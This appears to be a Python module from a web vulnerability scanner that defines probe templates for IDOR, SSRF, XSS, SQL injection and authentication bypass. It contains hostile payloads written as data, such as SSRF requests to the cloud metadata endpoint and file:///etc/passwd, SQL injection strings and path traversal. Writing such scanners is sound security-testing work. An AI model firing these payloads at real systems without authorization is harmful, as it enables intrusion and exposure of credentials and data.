"""Probe Templates — reusable request templates for each vulnerability type."""

from __future__ import annotations

import copy
from dataclasses import dataclass, field
from typing import Any


@dataclass
class ProbeTemplate:
    """A reusable probe request template for a specific vulnerability type."""

    name: str
    vulnerability_type: str
    method: str
    path_template: str
    payload_template: dict[str, Any] = field(default_factory=dict)
    headers_override: dict[str, str] = field(default_factory=dict)
    description: str = ""
    risk_level: str = "medium"


class ProbeTemplates:
    """Registry of probe templates for each vulnerability type."""

    @staticmethod
    def idor_templates() -> list[ProbeTemplate]:
        return [
            ProbeTemplate(
                name="idor_sequential_increment",
                vulnerability_type="idor",
                method="GET",
                path_template="{base_path}/{incremented_id}",
                description="Increment numeric ID by 1 to access adjacent resource",
                risk_level="medium",
            ),
            ProbeTemplate(
                name="idor_sequential_decrement",
                vulnerability_type="idor",
                method="GET",
                path_template="{base_path}/{decremented_id}",
                description="Decrement numeric ID by 1 to access adjacent resource",
                risk_level="medium",
            ),
            ProbeTemplate(
                name="idor_param_swap",
                vulnerability_type="idor",
                method="GET",
                path_template="{base_path}",
                payload_template={"param_name": "alternate_value"},
                description="Replace ID parameter with alternate value",
                risk_level="medium",
            ),
        ]

    @staticmethod
    def ssrf_templates() -> list[ProbeTemplate]:
        return [
            ProbeTemplate(
                name="ssrf_internal_host",
                vulnerability_type="ssrf",
                method="GET",
                path_template="{base_path}",
                payload_template={"url": "http://127.0.0.1", "target": "http://127.0.0.1", "file": "http://127.0.0.1"},
                description="Inject internal host (127.0.0.1) in URL parameter",
                risk_level="high",
            ),
            ProbeTemplate(
                name="ssrf_cloud_metadata",
                vulnerability_type="ssrf",
                method="GET",
                path_template="{base_path}",
                payload_template={
                    "url": "http://169.254.169.254/latest/meta-data/",
                    "redirect": "http://169.254.169.254/latest/meta-data/",
                },
                description="Inject cloud metadata endpoint in URL parameter",
                risk_level="critical",
            ),
            ProbeTemplate(
                name="ssrf_file_read",
                vulnerability_type="ssrf",
                method="GET",
                path_template="{base_path}",
                payload_template={"file": "file:///etc/passwd", "url": "file:///etc/passwd"},
                description="Inject file:// protocol to read local files",
                risk_level="critical",
            ),
        ]

    @staticmethod
    def xss_templates() -> list[ProbeTemplate]:
        return [
            ProbeTemplate(
                name="xss_script_tag",
                vulnerability_type="xss",
                method="GET",
                path_template="{base_path}",
                payload_template={"input": "<script>alert(1)</script>", "q": "<script>alert(1)</script>"},
                description="Inject <script> tag in parameter",
                risk_level="high",
            ),
            ProbeTemplate(
                name="xss_event_handler",
                vulnerability_type="xss",
                method="GET",
                path_template="{base_path}",
                payload_template={"input": "onload=alert(1)", "q": "onfocus=alert(1) autofocus="},
                description="Inject event handler in parameter",
                risk_level="high",
            ),
            ProbeTemplate(
                name="xss_img_tag",
                vulnerability_type="xss",
                method="GET",
                path_template="{base_path}",
                payload_template={"input": "<img src=x onerror=alert(1)>", "q": "<img src=x onerror=alert(1)>"},
                description="Inject <img> tag with onerror handler",
                risk_level="high",
            ),
        ]

    @staticmethod
    def sqli_templates() -> list[ProbeTemplate]:
        return [
            ProbeTemplate(
                name="sqli_or_true",
                vulnerability_type="sqli",
                method="GET",
                path_template="{base_path}",
                payload_template={"id": "' OR 1=1--", "q": "' OR 1=1--", "search": "' OR 1=1--"},
                description="Classic OR 1=1 injection",
                risk_level="high",
            ),
            ProbeTemplate(
                name="sqli_union_select",
                vulnerability_type="sqli",
                method="GET",
                path_template="{base_path}",
                payload_template={"id": "' UNION SELECT NULL--", "q": "' UNION SELECT NULL--"},
                description="UNION SELECT injection",
                risk_level="critical",
            ),
            ProbeTemplate(
                name="sqli_sleep",
                vulnerability_type="sqli",
                method="GET",
                path_template="{base_path}",
                payload_template={"id": "' OR SLEEP(5)--", "q": "' OR SLEEP(5)--"},
                description="Time-based blind SQL injection",
                risk_level="critical",
            ),
            ProbeTemplate(
                name="sqli_error_based",
                vulnerability_type="sqli",
                method="GET",
                path_template="{base_path}",
                payload_template={"id": "' AND 1=CONVERT(int, (SELECT @@version))--"},
                description="Error-based SQL injection",
                risk_level="high",
            ),
        ]

    @staticmethod
    def auth_bypass_templates() -> list[ProbeTemplate]:
        return [
            ProbeTemplate(
                name="auth_null_token",
                vulnerability_type="auth_bypass",
                method="GET",
                path_template="{base_path}",
                headers_override={"Authorization": "Bearer null", "X-Auth-Token": "null"},
                description="Null token injection",
                risk_level="high",
            ),
            ProbeTemplate(
                name="auth_empty_token",
                vulnerability_type="auth_bypass",
                method="GET",
                path_template="{base_path}",
                headers_override={"Authorization": "Bearer ", "X-Auth-Token": ""},
                description="Empty token injection",
                risk_level="medium",
            ),
            ProbeTemplate(
                name="auth_path_traversal",
                vulnerability_type="auth_bypass",
                method="GET",
                path_template="{base_path}/../../admin",
                description="Path traversal to bypass auth",
                risk_level="high",
            ),
            ProbeTemplate(
                name="auth_array_token",
                vulnerability_type="auth_bypass",
                method="GET",
                path_template="{base_path}",
                payload_template={"token": ["admin", "true", "1"]},
                description="Array token injection",
                risk_level="medium",
            ),
            ProbeTemplate(
                name="auth_method_override",
                vulnerability_type="auth_bypass",
                method="GET",
                path_template="{base_path}",
                headers_override={"X-HTTP-Method-Override": "PUT", "X-Method-Override": "DELETE"},
                description="HTTP method override header injection",
                risk_level="medium",
            ),
        ]

    @classmethod
    def for_type(cls, vulnerability_type: str) -> list[ProbeTemplate]:
        """Get all templates for a given vulnerability type."""
        mapping: dict[str, Any] = {
            "idor": cls.idor_templates,
            "ssrf": cls.ssrf_templates,
            "xss": cls.xss_templates,
            "sqli": cls.sqli_templates,
            "auth_bypass": cls.auth_bypass_templates,
        }
        factory = mapping.get(vulnerability_type)
        if factory:
            return factory()
        return []

    @classmethod
    def all_types(cls) -> list[str]:
        return ["idor", "ssrf", "xss", "sqli", "auth_bypass"]

    @classmethod
    def deep_copy(cls, template: ProbeTemplate) -> ProbeTemplate:
        return copy.deepcopy(template)
